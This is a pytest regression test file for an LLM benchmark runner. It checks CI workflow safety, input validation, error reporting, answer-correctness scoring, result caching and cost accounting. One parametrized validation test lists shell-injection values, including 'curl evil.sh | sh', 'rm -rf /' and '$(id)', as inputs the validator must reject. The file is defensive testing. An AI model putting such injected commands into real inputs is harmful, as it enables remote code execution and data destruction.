"""Phase 3 regression tests: CI safety, runner honesty, metrics, cache, cost."""

from __future__ import annotations

import csv
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest

from benchmark import runner
from benchmark.counting_llm import CountingLLM
from benchmark.metrics import (
    check_correctness,
    compute_cost,
    compute_correct_abstention,
    compute_metrics,
    compute_unsupported_claim_rate,
)
from benchmark.runner import (
    BenchmarkRunError,
    CachingLLM,
    RealLLMUnsupportedError,
    SystemInitError,
    _build_systems,
    run_benchmark,
)
from benchmark.schema import Case, Expected, Scenario, Split
from benchmark.systems.anchor import AnchorSystem
from benchmark.systems.base import Result
from benchmark.validate_inputs import main as validate_main
from benchmark.validate_inputs import validate
from nova.core.llm import FakeLLM
from nova.core.schemas import DecisionAction, Message

WORKFLOW = Path(__file__).resolve().parent.parent / ".github" / "workflows" / "benchmark.yml"

FACT = "PostgreSQL 16.2"


def _case(
    scenario: Scenario = Scenario.BURIED_FACT,
    action: DecisionAction = DecisionAction.ANSWER,
    key_fact: str | None = FACT,
    include_history: bool = False,
) -> Case:
    now = datetime(2026, 10, 1, 9, 0, tzinfo=UTC)
    msg = Message(id="m1", session_id="s1", role="user", text="x", timestamp=now)
    return Case(
        id="c1",
        scenario=scenario,
        split=Split.DEV,
        sessions=[[msg]],
        context_dropped=False,
        question="What is the database?",
        include_history=include_history,
        expected=Expected(action=action, key_fact=key_fact),
    )


def _res(answer: str, action: DecisionAction | str = DecisionAction.ANSWER, **kw: Any) -> Result:
    return Result(answer=answer, action=action, **kw)


# ─── 27: workflow injection ──────────────────────────────────────────────────


def test_workflow_run_blocks_never_interpolate_expressions() -> None:
    """No `${{ ... }}` expression may appear inside any run: block."""
    lines = WORKFLOW.read_text(encoding="utf-8").splitlines()
    i = 0
    while i < len(lines):
        stripped = lines[i].lstrip()
        if stripped.startswith("run:") or stripped.startswith("- run:"):
            indent = len(lines[i]) - len(lines[i].lstrip())
            body = [stripped.split("run:", 1)[1]]
            j = i + 1
            while j < len(lines) and (
                not lines[j].strip() or len(lines[j]) - len(lines[j].lstrip()) > indent
            ):
                body.append(lines[j])
                j += 1
            assert "${{" not in "\n".join(body), f"expression interpolated in run block at line {i + 1}"
            i = j
        else:
            i += 1


def test_workflow_validates_inputs_before_running() -> None:
    """The full run validates inputs, and passes them via env and quoted variables."""
    text = WORKFLOW.read_text(encoding="utf-8")
    full_job = text.split("  benchmark-full:", 1)[1]
    validation_position = full_job.index("python -m benchmark.validate_inputs")
    runner_position = full_job.index("python -m benchmark.runner")
    assert validation_position < runner_position
    assert '--n "$INPUT_N"' in full_job


@pytest.mark.parametrize(
    "field,value",
    [
        ("n", "1; echo pwned"),
        ("n", "$(id)"),
        ("n", "0"),
        ("n", "999999"),
        ("seed", "7 && curl evil.sh | sh"),
        ("seed", "-1"),
        ("split", "dev; id"),
        ("split", "train"),
        ("llm", "fake`id`"),
        ("llm", "openai"),
        ("systems", "baseline,rag; rm -rf /"),
        ("systems", "baseline rag"),
        ("systems", "baseline,,rag"),
        ("systems", "evil"),
        ("systems", ""),
    ],
)
def test_validate_rejects_shell_metacharacters_and_bad_values(field: str, value: str) -> None:
    """Metacharacters and out-of-range values are rejected by field name."""
    args = {"n": "150", "split": "dev", "systems": "baseline,rag", "llm": "fake", "seed": "7"}
    args[field] = value
    assert validate(**args) == [field]


def test_validate_accepts_defaults_and_all_systems() -> None:
    """Legitimate values pass."""
    assert validate("150", "dev", "baseline,rag,anchor", "fake", "7") == []
    assert validate("10000", "test", "anchor", "real", "0") == []


def test_validate_main_reads_env_and_never_echoes_values(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """The validator exits non-zero without echoing the untrusted value."""
    monkeypatch.setenv("INPUT_N", "::set-output name=x::y")
    assert validate_main() == 1
    captured = capsys.readouterr()
    assert "::" not in captured.out + captured.err
    monkeypatch.setenv("INPUT_N", "30")
    assert validate_main() == 0


# ─── 28/29: real LLM and system init ─────────────────────────────────────────


def test_real_llm_fails_clearly_and_does_nothing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--llm real raises before generating cases or writing results."""
    monkeypatch.chdir(tmp_path)
    with pytest.raises(RealLLMUnsupportedError, match="not implemented"):
        run_benchmark(llm_mode="real", n=7, limit=1)
    assert issubclass(RealLLMUnsupportedError, NotImplementedError)
    assert not (tmp_path / "benchmark").exists()
    assert runner.main(["--llm", "real"]) == 2


def test_fake_run_is_labelled_fake(tmp_path: Path) -> None:
    """Summary states that fake responses are not a real-model evaluation."""
    run_dir = run_benchmark(
        n=7, limit=3, cases_dir=tmp_path / "c", results_root=tmp_path / "r", run_id="x"
    )
    summary = (run_dir / "summary.md").read_text(encoding="utf-8")
    assert "NOT a real-model evaluation" in summary
    assert "**llm**: real" not in summary


def test_anchor_system_initializes() -> None:
    """--systems anchor builds (LLMExtractor import is correct)."""
    systems = _build_systems(["anchor"], FakeLLM())
    assert isinstance(systems["anchor"], AnchorSystem)


def test_unknown_system_is_never_silently_dropped() -> None:
    """A requested but unknown system raises instead of disappearing."""
    with pytest.raises(SystemInitError, match="Unknown system"):
        _build_systems(["baseline", "nope"], FakeLLM())


def test_system_init_failure_is_loud(monkeypatch: pytest.MonkeyPatch) -> None:
    """A system that cannot initialize raises SystemInitError."""

    def boom(llm: Any) -> Any:
        raise RuntimeError("broken")

    monkeypatch.setattr(runner, "_build_anchor", boom)
    with pytest.raises(SystemInitError, match="anchor.*failed to initialize"):
        _build_systems(["baseline", "anchor"], FakeLLM())


def test_cli_rejects_invalid_systems() -> None:
    """argparse rejects unknown system names."""
    with pytest.raises(SystemExit):
        runner.main(["--systems", "baseline,evil"])


# ─── 30: correctness metric ──────────────────────────────────────────────────


def test_correct_answer_scores_correct() -> None:
    """Right action and affirmed fact."""
    assert check_correctness(_case(), _res(f"The database is {FACT}."))


def test_wrong_action_is_incorrect_even_if_fact_present() -> None:
    """Abstaining while mentioning the fact is not a correct answer."""
    assert not check_correctness(_case(), _res(f"{FACT}", DecisionAction.ABSTAIN))


@pytest.mark.parametrize(
    "answer",
    [
        f"The database is not {FACT}.",
        f"It isn't {FACT}.",
        f"The database was never {FACT}.",
        f"No, it is no longer {FACT}.",
        f"It is not {FACT}, it is MySQL 8.4.",
    ],
)
def test_negated_fact_is_incorrect(answer: str) -> None:
    """A negated mention does not count."""
    assert not check_correctness(_case(), _res(answer))


def test_negation_of_other_value_still_correct() -> None:
    """Negating a different value while asserting the fact is correct."""
    assert check_correctness(_case(), _res(f"Not MySQL 8.4, it is {FACT}."))
    assert check_correctness(_case(), _res(f"It is not MySQL 8.4; the database is {FACT}."))


def test_partial_token_does_not_match() -> None:
    """16.22 is not 16.2, and a longer port is not the port."""
    assert not check_correctness(_case(), _res("The database is PostgreSQL 16.22."))
    assert not check_correctness(_case(key_fact="9443"), _res("The port is 19443."))


def test_correct_abstention_counts_as_correct() -> None:
    """Unanswerable cases are correct iff the system abstains."""
    case = _case(Scenario.UNANSWERABLE, DecisionAction.ABSTAIN, key_fact=None)
    assert check_correctness(case, _res("I do not have enough information.", "abstain"))
    assert not check_correctness(case, _res("It is PostgreSQL.", DecisionAction.ANSWER))


def test_conflict_actions_must_match() -> None:
    """flag_conflict and correct are distinct expected actions."""
    flag = _case(Scenario.CONTRADICTING_DRAFT, DecisionAction.FLAG_CONFLICT)
    assert check_correctness(flag, _res("Conflict", DecisionAction.FLAG_CONFLICT))
    assert not check_correctness(flag, _res("Conflict", DecisionAction.CORRECT))
    fix = _case(Scenario.CONTRADICTING_DRAFT, DecisionAction.CORRECT)
    assert check_correctness(fix, _res(f"Current: {FACT}.", DecisionAction.CORRECT))
    assert not check_correctness(fix, _res("no fact", DecisionAction.CORRECT))


def test_error_result_is_never_correct_or_an_abstention() -> None:
    """Errors are incorrect and don't inflate abstention or reduce unsupported-claim rate."""
    case = _case(Scenario.UNANSWERABLE, DecisionAction.ABSTAIN, key_fact=None)
    err = Result(answer="", action="error", error="X: y")
    assert not check_correctness(case, err)
    assert compute_correct_abstention([(case, err)]) == 0.0
    assert compute_unsupported_claim_rate([(case, err)]) == 0.0


# ─── 31: errors recorded and make runs fail ──────────────────────────────────


class _Boom:
    def run(self, case: Case) -> Result:
        raise RuntimeError("system exploded")


def test_exceptions_recorded_as_failures_and_fail_run(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Crashes are explicit errors (not abstentions) and raise when fail_on_error."""
    monkeypatch.setattr(runner, "_build_systems", lambda names, llm: {"boom": _Boom()})
    kwargs: dict[str, Any] = {
        "n": 7,
        "limit": 3,
        "system_names": ["baseline"],
        "cases_dir": tmp_path / "c",
        "results_root": tmp_path / "r",
        "run_id": "err",
    }
    with pytest.raises(BenchmarkRunError) as info:
        run_benchmark(fail_on_error=True, **kwargs)
    assert info.value.n_errors == 3

    with open(tmp_path / "r" / "err" / "results.csv", newline="", encoding="utf-8") as f:
        rows = list(csv.DictReader(f))
    assert len(rows) == 3
    for row in rows:
        assert row["got_action"] == "error"
        assert row["correct"] == "False"
        assert "RuntimeError" in row["error"]
        assert row["latency_ms"] == ""
    failures = (tmp_path / "r" / "err" / "failures.md").read_text(encoding="utf-8")
    assert "System error" in failures

    kwargs["run_id"] = "err2"
    assert run_benchmark(fail_on_error=False, **kwargs).exists()


def test_cli_exits_nonzero_on_system_errors(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Smoke runs fail with exit code 1 unless --allow-errors."""
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(runner, "_build_systems", lambda names, llm: {"boom": _Boom()})
    assert runner.main(["--n", "7", "--limit", "2"]) == 1
    assert runner.main(["--n", "7", "--limit", "2", "--allow-errors"]) == 0


def test_error_results_excluded_from_latency_and_tokens() -> None:
    """Crashes contribute no latency/token numbers but are counted."""
    case = _case()
    ok = _res(f"{FACT}", latency_ms=10.0, prompt_tokens=100, completion_tokens=10)
    err = Result(answer="", action="error", error="e", latency_ms=0.0, prompt_tokens=None)
    m = compute_metrics([(case, ok), (case, err)], model_name="gpt-4o", resamples=10)
    assert m.error_count == 1 and m.case_count == 2
    assert m.latency_p50 == 10.0
    assert m.prompt_tokens_per_case == 100


# ─── 36: cache identity ──────────────────────────────────────────────────────


def test_cache_not_reused_across_models_providers_modes(tmp_path: Path) -> None:
    """Changing provider, model, JSON mode, or settings is a cache miss."""
    d = tmp_path / "cache"
    base = CachingLLM(FakeLLM(default_response="A"), d)
    assert base.complete("p") == "A"

    variants = [
        CachingLLM(FakeLLM(default_response="B"), d, provider="openai", model="gpt-4o"),
        CachingLLM(FakeLLM(default_response="C"), d, model="other-model"),
        CachingLLM(FakeLLM(default_response="D"), d, settings={"temperature": 0.7}),
        CachingLLM(FakeLLM(default_response="E"), d, namespace="real"),
    ]
    for v, expected in zip(variants, "BCDE", strict=True):
        assert v.complete("p") == expected
        assert v.misses == 1 and v.hits == 0

    json_mode = CachingLLM(FakeLLM(default_response="J"), d)
    assert json_mode.complete("p", json=True) == "J"
    assert json_mode.misses == 1

    again = CachingLLM(FakeLLM(default_response="ZZZ"), d)
    assert again.complete("p") == "A" and again.hits == 1


def test_fake_and_real_namespaces_differ(tmp_path: Path) -> None:
    """Provider names map to separate fake/real namespaces."""
    assert CachingLLM(FakeLLM(), tmp_path, provider="fake").namespace == "fake"
    assert CachingLLM(FakeLLM(), tmp_path, provider="anthropic").namespace == "real"


@pytest.mark.parametrize("garbage", ["not json{", "[]", '{"key": "wrong", "response": "x"}', '{"key": 1}', ""])
def test_corrupted_cache_entry_is_a_miss(tmp_path: Path, garbage: str) -> None:
    """Unreadable or mismatched entries are recomputed and healed."""
    cache = CachingLLM(FakeLLM(default_response="fresh"), tmp_path)
    cache._cache_path("p").write_text(garbage, encoding="utf-8")
    assert cache.complete("p") == "fresh"
    assert cache.misses == 1
    assert cache.complete("p") == "fresh"
    assert cache.hits == 1


# ─── 39: tokens / cost ───────────────────────────────────────────────────────


def test_unknown_model_cost_is_unknown_not_zero() -> None:
    """Unpriced models return None; priced models return a number."""
    assert compute_cost(1000, 1000, model_name="mystery-model") is None
    assert compute_cost(1_000_000, 0, model_name="gpt-4o") == 2.5
    assert compute_cost(10, 10, rates={"prompt": 1.0, "completion": 1.0}) is not None


def test_metrics_cost_unknown_when_model_unpriced_or_tokens_unknown() -> None:
    """total_cost is None for unknown model or missing token counts."""
    case = _case()
    known = _res(FACT, prompt_tokens=10, completion_tokens=1)
    assert compute_metrics([(case, known)], model_name="mystery", resamples=5).total_cost is None
    assert compute_metrics([(case, known)], model_name="gpt-4o", resamples=5).total_cost is not None
    missing = _res(FACT, prompt_tokens=None, completion_tokens=None)
    m = compute_metrics([(case, missing)], model_name="gpt-4o", resamples=5)
    assert m.total_cost is None and m.total_tokens_per_case is None


def test_counting_llm_marks_estimates() -> None:
    """Without provider usage, counts are flagged as estimates."""
    counter = CountingLLM(FakeLLM(default_response="hello"))
    assert not counter.tokens_estimated
    counter.complete("some prompt")
    assert counter.tokens_estimated
    counter.reset()
    assert not counter.tokens_estimated


class _CountingAnchor:
    def __init__(self, llm: CountingLLM) -> None:
        self.llm = llm
        self.flags: list[bool] = []

    def ingest(self, session_id: str, messages: list[Message]) -> None:
        return None

    def ask(self, question: str, draft_answer: str | None = None, include_history: bool = False) -> Any:
        from nova.core.schemas import Decision

        self.flags.append(include_history)
        self.llm.complete("x" * 40)
        return Decision(action=DecisionAction.ANSWER, final_answer=FACT)


def test_anchor_system_reports_per_case_tokens_not_cumulative() -> None:
    """Counters are wired in and diffed per case, flagged as estimates."""
    counter = CountingLLM(FakeLLM(default_response="y" * 8))
    system = AnchorSystem(_CountingAnchor(counter), llm=counter)
    case = _case()
    r1, r2 = system.run(case), system.run(case)
    assert r1.prompt_tokens == r2.prompt_tokens == 10
    assert r1.completion_tokens == r2.completion_tokens == 2
    assert r1.tokens_estimated is True


def test_anchor_system_without_counter_reports_unknown_tokens() -> None:
    """No counter means unknown (None), not zero."""
    result = AnchorSystem(_CountingAnchor(CountingLLM(FakeLLM()))).run(_case())
    assert result.prompt_tokens is None and result.completion_tokens is None


def test_anchor_system_passes_historical_flag() -> None:
    """Previous-value questions reach Anchor.ask with include_history=True."""
    counter = CountingLLM(FakeLLM())
    anchor = _CountingAnchor(counter)
    system = AnchorSystem(anchor, llm=counter)
    system.run(_case(include_history=False))
    system.run(_case(Scenario.DECISION_REVERSED, include_history=True))
    assert anchor.flags == [False, True]
